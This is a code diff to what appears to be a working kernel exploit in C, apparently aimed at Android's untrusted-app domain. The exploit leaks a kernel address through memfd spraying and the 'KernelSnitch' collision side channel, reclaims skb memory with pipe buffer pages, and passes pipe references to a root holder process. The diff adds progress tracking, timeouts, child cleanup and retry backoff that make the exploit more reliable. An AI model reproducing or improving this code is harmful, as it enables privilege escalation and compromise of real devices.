@@ -1,5 +1,7 @@
 #include "common.h"
 
+#include <poll.h>
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 #include P0_FINGERPRINT_HEADER
 #endif
@@ -44,7 +46,29 @@ static void close_p0_gate_holders(void) {
 #endif
 #endif
 
+enum pipe_prepare_stage {
+  PIPE_PREPARE_STAGE_IDLE = 0,
+  PIPE_PREPARE_STAGE_CHILD_BEGIN,
+  PIPE_PREPARE_STAGE_PREP_MEMFDS,
+  PIPE_PREPARE_STAGE_SPRAY_MEMFDS,
+  PIPE_PREPARE_STAGE_KSNITCH_SETUP,
+  PIPE_PREPARE_STAGE_COLLISION_LAYOUT,
+  PIPE_PREPARE_STAGE_COLLISION_WAIT,
+  PIPE_PREPARE_STAGE_COLLISIONS_READY,
+  PIPE_PREPARE_STAGE_SKB_RECLAIM,
+  PIPE_PREPARE_STAGE_BRUTEFORCE,
+  PIPE_PREPARE_STAGE_PIPE_ALLOC,
+  PIPE_PREPARE_STAGE_RESULT,
+};
+
+struct pipe_prepare_progress {
+  atomic_int stage;
+  atomic_int index;
+};
+
 pid_t pipe_prepare_child = -1;
+int pipe_prepare_hard_failed;
+static struct pipe_prepare_progress *pipe_prepare_progress;
 uint64_t kmalloc_pipe_cache;
 uint64_t kmalloc_normal_1k_cache;
 uint64_t kmalloc_normal_2k_cache;
@@ -110,39 +134,154 @@ void free_pipe_object(int pipefd[2]) {
   resize_pipe_slots(pipefd, 2);
 }
 
+static size_t pipe_prepare_elapsed_ms(size_t started) {
+  return (gettime_ns() - started) / 1000000ULL;
+}
+
+static void set_pipe_prepare_progress(int stage, int index) {
+  if (!pipe_prepare_progress) {
+    return;
+  }
+  atomic_store_explicit(&pipe_prepare_progress->index, index,
+                        memory_order_relaxed);
+  atomic_store_explicit(&pipe_prepare_progress->stage, stage,
+                        memory_order_release);
+}
+
+#if defined(PIPE_PREPARE_TIMEOUT_MS) && PIPE_PREPARE_TIMEOUT_MS > 0
+static const char *pipe_prepare_stage_name(int stage) {
+  switch (stage) {
+    case PIPE_PREPARE_STAGE_CHILD_BEGIN: return "child-begin";
+    case PIPE_PREPARE_STAGE_PREP_MEMFDS: return "prep-memfds";
+    case PIPE_PREPARE_STAGE_SPRAY_MEMFDS: return "spray-memfds";
+    case PIPE_PREPARE_STAGE_KSNITCH_SETUP: return "kernelsnitch-setup";
+    case PIPE_PREPARE_STAGE_COLLISION_LAYOUT: return "collision-layout";
+    case PIPE_PREPARE_STAGE_COLLISION_WAIT: return "collision-wait";
+    case PIPE_PREPARE_STAGE_COLLISIONS_READY: return "collisions-ready";
+    case PIPE_PREPARE_STAGE_SKB_RECLAIM: return "skb-reclaim";
+    case PIPE_PREPARE_STAGE_BRUTEFORCE: return "bruteforce";
+    case PIPE_PREPARE_STAGE_PIPE_ALLOC: return "pipe-alloc";
+    case PIPE_PREPARE_STAGE_RESULT: return "result";
+    default: return "idle";
+  }
+}
+#endif
+
+static void release_pipe_prepare_progress(void) {
+  if (pipe_prepare_progress) {
+    munmap(pipe_prepare_progress, PAGE_SIZE);
+    pipe_prepare_progress = NULL;
+  }
+}
+
+static void close_pipe_parent_objects(void) {
+  if (!pipe_objects_ready) {
+    return;
+  }
+  for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    if (pipe_fds_drain[i][0] >= 0) close(pipe_fds_drain[i][0]);
+    if (pipe_fds_drain[i][1] >= 0) close(pipe_fds_drain[i][1]);
+    pipe_fds_drain[i][0] = -1;
+    pipe_fds_drain[i][1] = -1;
+  }
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    if (pipe_fds_reclaim[i][0] >= 0) close(pipe_fds_reclaim[i][0]);
+    if (pipe_fds_reclaim[i][1] >= 0) close(pipe_fds_reclaim[i][1]);
+    pipe_fds_reclaim[i][0] = -1;
+    pipe_fds_reclaim[i][1] = -1;
+  }
+  pipe_objects_ready = 0;
+}
+
+#ifndef PIPE_PREPARE_REAP_TIMEOUT_MS
+#define PIPE_PREPARE_REAP_TIMEOUT_MS 3000
+#endif
+
+int stop_pipe_prepare_child(void) {
+  if (pipe_prepare_child <= 0) {
+    return 1;
+  }
+
+  pid_t child = pipe_prepare_child;
+  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
+    pr_warning("pipe prepare child kill failed pid=%d errno=%d\n",
+               child, errno);
+  }
+
+  size_t deadline = gettime_ns() +
+      (size_t)PIPE_PREPARE_REAP_TIMEOUT_MS * 1000000ULL;
+  for (;;) {
+    int status = 0;
+    pid_t waited = waitpid(child, &status, WNOHANG);
+    if (waited == child || (waited < 0 && errno == ECHILD)) {
+      pipe_prepare_child = -1;
+      return 1;
+    }
+    if (waited < 0 && errno != EINTR) {
+      pr_warning("pipe prepare child reap failed pid=%d errno=%d\n",
+                 child, errno);
+      pipe_prepare_hard_failed = 1;
+      return 0;
+    }
+    if (gettime_ns() >= deadline) {
+      pr_warning("pipe prepare child reap timeout pid=%d timeout_ms=%d\n",
+                 child, PIPE_PREPARE_REAP_TIMEOUT_MS);
+      pipe_prepare_hard_failed = 1;
+      return 0;
+    }
+    usleep(10000);
+  }
+}
+
 uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx prep;
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  size_t started = gettime_ns();
 
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_CHILD_BEGIN, 0);
+  pr_info("pipe prepare stage=begin prep=%zu spray=%zu pre=%zu post=%zu\n",
+          prep.mm_cnt, spray.mm_cnt, pre.mm_cnt, post.mm_cnt);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_PREP_MEMFDS, (int)i);
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
   }
   for (size_t i = 0; i < spray.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_SPRAY_MEMFDS, (int)i);
     spray.childs[i] = -1;
     spray.memfds[i] = clone_memfd();
   }
+  pr_info("pipe prepare stage=baseline-memfds elapsed_ms=%zu\n",
+          pipe_prepare_elapsed_ms(started));
 
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_KSNITCH_SETUP, 0);
   setup_kernelsnitch();
+  pr_info("pipe prepare stage=kernelsnitch-ready elapsed_ms=%zu\n",
+          pipe_prepare_elapsed_ms(started));
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISION_LAYOUT, (int)i);
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
   }
   pid_t leak_child = clone_leak_child();
   for (size_t i = 0; i < post.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISION_LAYOUT,
+                              (int)(pre.mm_cnt + i));
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
   }
   int leak_memfd = open_memfd(leak_child);
+  pr_info("pipe prepare stage=collision-layout leak_pid=%d elapsed_ms=%zu\n",
+          leak_child, pipe_prepare_elapsed_ms(started));
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
@@ -153,12 +292,19 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     kill_child(spray.childs[i]);
   }
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISION_WAIT, leak_child);
+  pr_info("pipe prepare stage=collision-wait leak_pid=%d elapsed_ms=%zu\n",
+          leak_child, pipe_prepare_elapsed_ms(started));
   SYSCHK(waitpid(leak_child, NULL, 0));
 
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISIONS_READY, 0);
+  pr_info("pipe prepare stage=collisions-ready elapsed_ms=%zu\n",
+          pipe_prepare_elapsed_ms(started));
 
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_SKB_RECLAIM, 0);
   unsigned char *buf = malloc(SKB_SEND_SIZE);
   memset(buf, 0x50, SKB_SEND_SIZE);
 
@@ -206,6 +352,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_BRUTEFORCE, 0);
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
@@ -232,6 +379,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 #endif
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_PIPE_ALLOC, (int)i);
     alloc_pipe_object(pipe_fds_drain[i]);
   }
 
@@ -239,6 +387,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_PIPE_ALLOC,
+                              (int)(PIPE_DRAIN + i));
     alloc_pipe_object(pipe_fds_reclaim[i]);
   }
 
@@ -251,10 +401,34 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   free_ctx_storage(&pre);
   free_ctx_storage(&post);
   free(buf);
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_RESULT, 0);
+  pr_info("pipe prepare stage=reclaim-ready base=%016zx elapsed_ms=%zu\n",
+          base, pipe_prepare_elapsed_ms(started));
   return base;
 }
 
 uintptr_t prepare_pipe_buffer_page(void) {
+  if (pipe_prepare_hard_failed) {
+    pr_warning("pipe prepare refused after hard failure\n");
+    return 0;
+  }
+#if defined(PIPE_PREPARE_TIMEOUT_MS) && PIPE_PREPARE_TIMEOUT_MS > 0
+  if (pipe_prepare_child > 0) {
+    pr_warning("pipe prepare refused while child=%d is still active\n",
+               pipe_prepare_child);
+    pipe_prepare_hard_failed = 1;
+    return 0;
+  }
+#endif
+  release_pipe_prepare_progress();
+  pipe_prepare_progress = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (pipe_prepare_progress == MAP_FAILED) {
+    pipe_prepare_progress = NULL;
+    pr_error("pipe prepare progress mmap failed errno=%d\n", errno);
+  }
+  atomic_init(&pipe_prepare_progress->stage, PIPE_PREPARE_STAGE_IDLE);
+  atomic_init(&pipe_prepare_progress->index, 0);
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     make_pipe_object(pipe_fds_drain[i]);
   }
@@ -268,6 +442,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
   pid_t child = SYSCHK(fork());
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    signal(SIGPIPE, SIG_IGN);
     if (getppid() == 1) {
       _exit(1);
     }
@@ -279,7 +454,14 @@ uintptr_t prepare_pipe_buffer_page(void) {
       pipe_fds_drain[i][0] = -1;
       pipe_fds_drain[i][1] = -1;
     }
-    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_RESULT, 1);
+    ssize_t wrote;
+    do {
+      wrote = write(result_pipe[1], &base, sizeof(base));
+    } while (wrote < 0 && errno == EINTR);
+    if (wrote != (ssize_t)sizeof(base)) {
+      _exit(1);
+    }
     for (;;) {
       sleep(60);
     }
@@ -288,12 +470,61 @@ uintptr_t prepare_pipe_buffer_page(void) {
   pipe_prepare_child = child;
   SYSCHK(close(result_pipe[1]));
   uintptr_t base = 0;
-  ssize_t got = read(result_pipe[0], &base, sizeof(base));
+#if defined(PIPE_PREPARE_TIMEOUT_MS) && PIPE_PREPARE_TIMEOUT_MS > 0
+  struct pollfd result_poll = {
+    .fd = result_pipe[0],
+    .events = POLLIN | POLLHUP,
+  };
+  int ready;
+  size_t wait_deadline = gettime_ns() +
+      (size_t)PIPE_PREPARE_TIMEOUT_MS * 1000000ULL;
+  pr_info("pipe prepare parent stage=wait child=%d timeout_ms=%d\n",
+          child, PIPE_PREPARE_TIMEOUT_MS);
+  for (;;) {
+    size_t now = gettime_ns();
+    if (now >= wait_deadline) {
+      ready = 0;
+      break;
+    }
+    size_t remaining_ns = wait_deadline - now;
+    int remaining_ms = (int)((remaining_ns + 999999ULL) / 1000000ULL);
+    ready = poll(&result_poll, 1, remaining_ms);
+    if (ready >= 0 || errno != EINTR) {
+      break;
+    }
+  }
+  if (ready <= 0) {
+    int progress_stage = atomic_load_explicit(
+        &pipe_prepare_progress->stage, memory_order_acquire);
+    int progress_index = atomic_load_explicit(
+        &pipe_prepare_progress->index, memory_order_relaxed);
+    pipe_prepare_hard_failed = 1;
+    pr_warning("pipe prepare parent stage=%s child=%d progress=%s/%d "
+               "errno=%d\n",
+               ready == 0 ? "timeout" : "poll-error", child,
+               pipe_prepare_stage_name(progress_stage), progress_index,
+               ready == 0 ? ETIMEDOUT : errno);
+    close(result_pipe[0]);
+    close_pipe_parent_objects();
+    int reaped = stop_pipe_prepare_child();
+    pr_warning("pipe prepare parent hard-failure child=%d reaped=%d\n",
+               child, reaped);
+    release_pipe_prepare_progress();
+    return 0;
+  }
+#endif
+  ssize_t got;
+  do {
+    got = read(result_pipe[0], &base, sizeof(base));
+  } while (got < 0 && errno == EINTR);
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
     pr_warning("pipe page child did not report base\n");
     base = 0;
   }
+  pr_info("pipe prepare parent stage=result child=%d got=%zd base=%016zx\n",
+          child, got, base);
+  release_pipe_prepare_progress();
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     close(pipe_fds_drain[i][0]);
     close(pipe_fds_drain[i][1]);
@@ -305,22 +536,11 @@ uintptr_t prepare_pipe_buffer_page(void) {
 
 void reset_pipe_attempt(void) {
   if (pipe_prepare_child > 0) {
-    kill(pipe_prepare_child, SIGKILL);
-    waitpid(pipe_prepare_child, NULL, 0);
-    pipe_prepare_child = -1;
+    stop_pipe_prepare_child();
   }
 
-  if (pipe_objects_ready) {
-    for (size_t i = 0; i < PIPE_DRAIN; i++) {
-      close(pipe_fds_drain[i][0]);
-      close(pipe_fds_drain[i][1]);
-    }
-    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-      close(pipe_fds_reclaim[i][0]);
-      close(pipe_fds_reclaim[i][1]);
-    }
-    pipe_objects_ready = 0;
-  }
+  close_pipe_parent_objects();
+  release_pipe_prepare_progress();
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -909,6 +1129,7 @@ static int pipe_duplicate_bytes(
   return duplicated == (ssize_t)size;
 }
 
+#if !defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED
 static int transfer_p0_references_to_root(int retained_pipe_index) {
   int retained_fds[] = {
     pipe_fds_reclaim[retained_pipe_index][0],
@@ -973,6 +1194,7 @@ static int transfer_p0_references_to_root(int retained_pipe_index) {
   close(socket_fd);
   return transferred;
 }
+#endif
 
 static void spawn_p0_ref_keeper(int retained_pipe_index) {
   pid_t child = SYSCHK(fork());
@@ -1014,12 +1236,29 @@ static void spawn_p0_ref_keeper(int retained_pipe_index) {
       pause();
     }
   }
+#if defined(APP_ROOT_REF_HOLDER_REQUIRED) && \
+    !APP_ROOT_REF_HOLDER_REQUIRED
+  /* This target only needs the detached process to retain the selected pipe
+   * references.  Polling the root socket can never improve correctness and,
+   * in an untrusted-app domain, creates a denied/audited connect every 10 ms. */
+  for (;;) {
+    pause();
+  }
+#else
+  useconds_t retry_delay = 10000;
   for (;;) {
     if (transfer_p0_references_to_root(retained_pipe_index)) {
       _exit(0);
     }
-    usleep(10000);
+    usleep(retry_delay);
+    if (retry_delay < 1000000) {
+      retry_delay *= 2;
+      if (retry_delay > 1000000) {
+        retry_delay = 1000000;
+      }
+    }
   }
+#endif
 }
 
 void start_p0_ref_keeper(void) {
